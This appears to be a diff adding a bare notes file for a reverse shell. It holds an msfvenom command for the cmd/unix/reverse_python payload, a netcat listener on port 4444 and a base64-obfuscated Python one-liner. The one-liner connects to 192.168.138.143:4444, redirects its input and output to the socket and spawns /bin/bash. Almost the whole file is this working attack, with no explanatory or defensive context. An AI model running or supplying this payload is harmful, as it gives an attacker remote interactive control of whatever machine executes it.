@@ -1,0 +1,25 @@
+cmd/unix/reverse_python
+
+
+
+nc.exe -l -p 4444
+
+
+msfvenom.bat -p cmd/unix/reverse_python LHOST=192.168.138.143
+
+python -c "exec('aW1wb3J0IHNvY2tldCAgICAgICAgICwgc3VicHJvY2VzcyAgICAgICAgICwgb3MgOyAgICBob3N0PSIxOTIuMTY4LjEzOC4xNDMiIDsgICAgcG9ydD00NDQ0IDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgICAgICAgLCBzb2NrZXQuU09DS19TVFJFQU0pIDsgICAgcy5jb25uZWN0KChob3N0ICAgICAgICAgLCBwb3J0KSkgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICAsIDApIDsgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAgLCAxKSA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgICwgMikgOyAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik='.decode('base64'))"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
